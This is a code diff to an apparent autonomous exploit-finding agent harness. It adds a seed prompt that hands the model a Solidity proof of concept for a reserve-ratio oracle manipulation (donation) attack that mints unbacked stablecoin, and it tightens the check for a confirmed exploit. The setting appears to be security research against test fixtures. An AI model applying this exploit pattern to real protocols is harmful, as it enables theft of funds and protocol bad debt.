@@ -12,6 +12,7 @@ Either way the model reaches the same six tools via tools.dispatch().
 """
 
 import json
+import os
 import re
 import time
 
@@ -88,6 +89,58 @@ Begin recon now, then produce at least one confirmed fork_and_execute exploit. I
 (you have a bounded number of tool calls). Finish with a concise report of every vulnerability you \
 confirmed, each with its impact."""
 
+# Optional seed (RED_QUEEN_SEED=1). This does NOT change the default pure-autonomous behavior; it
+# only *appends* a concrete hypothesis to the task prompt so a slow backend (DeepSeek-R1 on the HF
+# router is ~5.5 min/round-trip) can spend its few round-trips confirming an exploit rather than on
+# broad recon. The agent still writes and runs the PoC itself via fork_and_execute. This is the
+# master plan's Hour-14 "hand it the attack template" pivot.
+SEED_HINT = """
+
+PRIORITY DIRECTIVE (seeded run): Skip broad recon. Your VERY FIRST action must be a \
+`fork_and_execute` call that instantiates the hypothesis below. Do not call decompile/price_query \
+first - go straight to the PoC, then iterate on any revert reason.
+
+CONFIRMED-STRUCTURE HYPOTHESIS - GoldAdapter donation / reserve-ratio oracle manipulation:
+GoldAdapter.exchangeRate() = goldToken.balanceOf(goldPool) * 1e18 / totalShares - a bare reserve \
+ratio with no share accounting on inbound transfers. A direct goldToken.transfer(goldPool, amount) \
+(minting NO shares) inflates that rate, and PriceRouter.getPrice(goldAdapter) folds the rate into \
+the USD price. AccountManager.deposit() then credits principal at that inflated price, so a tiny \
+1e18 deposit mints far more rwaUSD than its fair collateral value = unbacked mint / protocol bad \
+debt.
+
+Instantiate (and adapt if it reverts) this exploit_body - the Setup fixtures \
+accountManager, goldAdapter, goldToken, goldPool, ledger, token, priceRouter, vm, console2 are all \
+live:
+```solidity
+address atk = makeAddr("atk");
+goldToken.mint(atk, 231_000e18);
+vm.startPrank(atk);
+uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;
+goldToken.transfer(goldPool, 230_000e18);        // donation spikes the rate, no shares minted
+goldToken.approve(address(goldAdapter), 1e18);
+accountManager.deposit(address(goldAdapter), 1e18);
+uint256 minted = ledger.principal(atk);
+accountManager.mint(minted);
+vm.stopPrank();
+uint256 fair = 1e18 * fairPrice / 1e18;
+uint256 unbacked = token.balanceOf(atk) - fair;
+console2.log("PROFIT_USD", unbacked);
+require(token.balanceOf(atk) > fair * 10, "no material unbacked mint");
+```
+Emit this now as your first {"tool":"fork_and_execute","args":{"exploit_body":"..."}} action \
+(remember to escape newlines/quotes in the JSON string). After it passes, give your final report."""
+
+
+def _seed_enabled():
+    return os.environ.get("RED_QUEEN_SEED", "").strip().lower() in ("1", "true", "yes", "on")
+
+
+def _task_prompt():
+    prompt = TASK_PROMPT % _target_context()
+    if _seed_enabled():
+        prompt += SEED_HINT
+    return prompt
+
 
 class HFDeepSeekAgent:
     name = "hf-deepseek-r1"
@@ -114,7 +167,10 @@ class HFDeepSeekAgent:
         self.tool_calls.append({"name": name, "input": args,
                                 "summary": result.get("summary", ""), "ok": result.get("ok", False),
                                 "ts": time.time()})
-        if name == "fork_and_execute" and result.get("passed"):
+        # A confirmation must be a REAL exploit: the test passed AND it minted positive unbacked
+        # value (PROFIT_USD). A passing test alone (e.g. a no-op require(true)) is NOT an exploit -
+        # this guards against false "EXPLOIT CONFIRMED" results from trivial PoCs.
+        if name == "fork_and_execute" and result.get("passed") and (result.get("profit_usd") or 0) > 0:
             self.confirmed.append({"summary": result.get("summary"),
                                    "profit_usd": result.get("profit_usd"),
                                    "poc_solidity": result.get("poc_solidity")})
@@ -132,7 +188,7 @@ class HFDeepSeekAgent:
     # --- native OpenAI tool-calling loop ---
     def _run_tools_mode(self, deadline):
         messages = [{"role": "system", "content": SYSTEM_PROMPT},
-                    {"role": "user", "content": TASK_PROMPT % _target_context()}]
+                    {"role": "user", "content": _task_prompt()}]
         oai_tools = _openai_tool_schemas()
         final = ""
         for it in range(config.MAX_AUTONOMOUS_ITERATIONS):
@@ -189,7 +245,7 @@ class HFDeepSeekAgent:
 
     def _run_text_mode(self, deadline):
         messages = [{"role": "system", "content": SYSTEM_PROMPT + "\n\n" + self._PROTOCOL},
-                    {"role": "user", "content": TASK_PROMPT % _target_context()}]
+                    {"role": "user", "content": _task_prompt()}]
         final = ""
         for it in range(config.MAX_AUTONOMOUS_ITERATIONS):
             if time.time() > deadline:
